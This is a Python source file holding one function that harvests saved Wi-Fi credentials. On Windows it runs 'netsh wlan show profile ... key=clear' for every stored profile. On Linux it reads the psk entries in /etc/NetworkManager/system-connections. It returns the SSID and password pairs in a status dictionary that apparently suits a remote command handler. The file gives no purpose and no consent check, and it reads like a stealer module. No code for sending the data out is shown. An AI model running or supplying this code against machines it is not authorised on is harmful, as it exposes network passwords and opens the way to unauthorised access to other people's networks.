import platform
import subprocess
import re
import os
import logging

logger = logging.getLogger(__name__)

def get_wifi_passwords():
    try:
        if platform.system() == "Windows":
            cmd = "netsh wlan show profiles"
            profiles = subprocess.check_output(cmd, shell=True, text=True, errors='ignore')
            wifi_list = []
            for line in profiles.split('\n'):
                if "All User Profile" in line:
                    ssid = line.split(":")[1].strip()
                    cmd = f'netsh wlan show profile name="{ssid}" key=clear'
                    details = subprocess.check_output(cmd, shell=True, text=True, errors='ignore')
                    password = ""
                    for detail in details.split('\n'):
                        if "Key Content" in detail:
                            password = detail.split(":")[1].strip()
                    wifi_list.append({"ssid": ssid, "password": password or "N/A"})
            return {"status": "Success", "wifi_list": wifi_list}
        elif platform.system() == "Linux":
            wifi_list = []
            try:
                configs = os.listdir("/etc/NetworkManager/system-connections/")
                for config in configs:
                    with open(f"/etc/NetworkManager/system-connections/{config}", 'r') as f:
                        data = f.read()
                        ssid = re.search(r'ssid=(.*)', data)
                        password = re.search(r'psk=(.*)', data)
                        wifi_list.append({
                            "ssid": ssid.group(1) if ssid else "Unknown",
                            "password": password.group(1) if password else "N/A"
                        })
                return {"status": "Success", "wifi_list": wifi_list}
            except:
                return {"error": "Requires sudo or access to /etc/NetworkManager"}
        else:
            return {"error": "Unsupported platform"}
    except Exception as e:
        logger.error(f"WiFi password error: {str(e)}")
        return {"error": f"Failed to retrieve Wi-Fi passwords: {str(e)}"}